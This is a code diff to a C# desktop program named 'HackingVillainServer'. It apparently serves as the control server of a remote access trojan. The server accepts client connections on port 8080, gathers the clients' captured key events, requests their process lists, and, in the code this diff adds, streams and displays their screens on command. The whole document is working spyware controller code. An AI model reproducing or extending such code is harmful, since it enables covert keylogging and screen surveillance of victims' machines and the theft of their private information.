@@ -30,6 +30,16 @@ namespace HackingVillainServer
             list.Images.Add(Image.FromFile("쟌.png"));
             listView1.LargeImageList = list;
             _server = AweSock.TcpListen(8080);
+        }
+
+        ~Form1()
+        {
+            _listen.Abort();
+        }
+
+        protected override void OnShown(EventArgs e)
+        {
+            base.OnShown(e);
 
             Connect();
             _listen = new Thread(() =>
@@ -42,11 +52,6 @@ namespace HackingVillainServer
             _listen.Start();
         }
 
-        ~Form1()
-        {
-            _listen.Abort();
-        }
-
         public void Connect()
         {
             ISocket client = AweSock.TcpAccept(_server);
@@ -55,22 +60,71 @@ namespace HackingVillainServer
             this.listView1.Items.Add(client.GetRemoteEndPoint().ToString(), 0);
         }
 
+        Buffer next;
+        ScreenViewer viewer;
         public void Listen()
         {
             Buffer inBuf = Buffer.New();
-            AweSock.ReceiveMessage(_clients[0].Socket, inBuf);
-            Buffer.FinalizeBuffer(inBuf);
-            var k = Encoding.UTF8.GetString(Buffer.GetBuffer(inBuf)).TrimEnd('\0');
-            if (_readyForProcess)
+            if (!_readyForSize && _readyForScreen)
             {
-                _readyForProcess = false;
-                EventViewer viewer = new EventViewer(k.Split('\n').ToList());
-                this.Invoke((MethodInvoker)delegate () {
-                    viewer.Show();
-                 });
+                AweSock.ReceiveMessage(_clients[0].Socket, next);
+                Buffer.FinalizeBuffer(next);
             }
             else
             {
+                AweSock.ReceiveMessage(_clients[0].Socket, inBuf);
+                Buffer.FinalizeBuffer(inBuf);
+            }
+
+            if (_readyForProcess)
+            {
+                var k = Encoding.UTF8.GetString(Buffer.GetBuffer(inBuf)).TrimEnd('\0');
+
+                _readyForProcess = false;
+                EventViewer viewer = new EventViewer(k.Split('\n').ToList());
+                this.Invoke((MethodInvoker)delegate ()
+                {
+                    viewer.Show();
+                });
+            }
+            else if (_readyForScreen && _readyForSize)
+            {
+                _readyForSize = false;
+                next = Buffer.New(Buffer.Get<int>(inBuf));
+            }
+            else if (_readyForScreen && !_readyForSize)
+            {
+                using (var ms = new MemoryStream(Buffer.GetBuffer(next)))
+                {
+                    var img = Image.FromStream(ms);
+                    if (viewer != null)
+                        viewer.BackgroundImage = img;
+                    else
+                    {
+                        viewer = new ScreenViewer(img);
+
+                        viewer.FormClosed += (b, d) =>
+                        {
+                            this.Invoke(new MethodInvoker(() =>
+                            {
+                                Send("Stop Showing");
+                                _readyForSize = false;
+                                _readyForScreen = false;
+                            }));
+                        };
+
+                        this.Invoke((MethodInvoker)delegate ()
+                        {
+                            viewer.Show();
+                        });
+                    }
+                    _readyForSize = true;
+                }
+            }
+            else
+            {
+                var k = Encoding.UTF8.GetString(Buffer.GetBuffer(inBuf)).TrimEnd('\0');
+
                 _clients[0].KeyEvents.Add(k);
             }
             Thread.Sleep(10);
@@ -135,6 +189,17 @@ namespace HackingVillainServer
                 return;
             _readyForProcess = true;
             Send("Show Me The Process");
+        }
+
+        bool _readyForSize = false;
+        bool _readyForScreen = false;
+        private void 화면SToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            if (listView1.SelectedItems.Count != 1)
+                return;
+            _readyForSize = true;
+            _readyForScreen = true;
+            Send("Show Me The Screen");
         }
     }
 }
